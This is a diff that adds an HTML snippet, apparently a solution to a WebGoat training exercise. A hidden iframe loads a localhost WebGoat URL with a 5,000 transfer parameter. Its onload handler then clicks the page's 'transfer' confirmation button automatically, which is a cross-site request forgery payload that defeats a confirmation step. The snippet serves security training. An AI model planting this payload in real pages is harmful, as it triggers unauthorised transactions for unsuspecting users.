@@ -1,0 +1,8 @@
+<script type="text/javascript">function clickConfirm(){
+  var myframe = document.getElementById("myframe");
+  console.log("hello ",myframe);
+  var confirm = myframe.contentWindow.document.getElementsByName("transfer")[0];
+  confirm.click()
+  }
+</script>
+<iframe id="myframe" src="http://localhost:8090/WebGoat/attack?Screen=2094584595&menu=900&transfer=5000" onload="clickConfirm()"></iframe>
